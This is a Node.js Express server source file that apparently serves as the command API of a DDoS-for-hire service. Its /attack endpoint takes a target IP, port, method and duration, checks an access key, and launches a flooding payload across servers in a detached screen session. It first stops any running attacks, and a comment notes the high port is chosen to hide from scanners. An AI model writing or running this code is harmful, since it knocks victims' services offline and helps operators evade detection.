const express = require('express');
const app = express()
const PORT = 25649 // Use a port greater than 10k to hide from scanners

const yup = require('yup');
const helmet = require("helmet");
const morgan = require('morgan')
const log = require('log-to-file');
const path = require('path')
const rateLimit = require("express-rate-limit");

const launch = require('./handler/launch');
const generalFunctions = require('./handler/check');

const schema = yup.object().shape({
	target: yup.string().required(),
	port: yup.number().min(1).max(65535),
	method: yup.string().required(),
	duration: yup.number().min(10).max(15000),
	key: yup.string().required()
});
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

app.use(helmet());
app.use(morgan('tiny'));
app.use(limiter);

app.set('trust proxy', true)

app.get('/', (req, res, next) => {
	log(`CLIENT: ${req.ip} WENT TO PAGE /`)
	res.status(404)
	res.sendFile(path.join(__dirname, 'page.html'))
})
app.get('/attack', async (req, res, next) => {
	let {
		target,
		port,
		method,
		duration,
		key
	} = req.query;
	try {
		await schema.validate({
			target,
			port,
			method,
			duration,
			key
		})
		if(!generalFunctions.checkKey(key))
			throw new Error('Invalid token key. Authentication failed.')
		if(!generalFunctions.checkIsIPV4(target))
			throw new Error('Invalid IP Address. Please enter a correct one.')
		method = method.toUpperCase()
		const methodPayload = generalFunctions.getPayload({
			method,
			target,
			port,
			duration
		})
		if(!methodPayload)
			throw new Error('Invalid method, not found in database.')
		const shellPayload = `screen -S ddosing_shit -dm ${methodPayload}`
		await launch(`./stopdos.sh`) // Shutting all current attacks
		const results = await launch(shellPayload)
		log(`CLIENT : ${req.ip} TARGET : ${target} PORT : ${PORT} METHOD : ${method} TIME : ${duration}`)
		res.json({
			success : true,
			message : `${results.length} servers has launched the payload successfully.`,
			logs : results
		})
	} catch (err) {
		console.log(err)
		log(`CLIENT: ${req.ip} ERROR : ${err.message}`)
		res.json({
			success : false,
			message : "Unfortunately an error happened :(",
			logs : err.message
		})
	}
})
app.listen(PORT, () => {
	console.log(`Denial API is running in port http://localhost:${PORT}/`)
})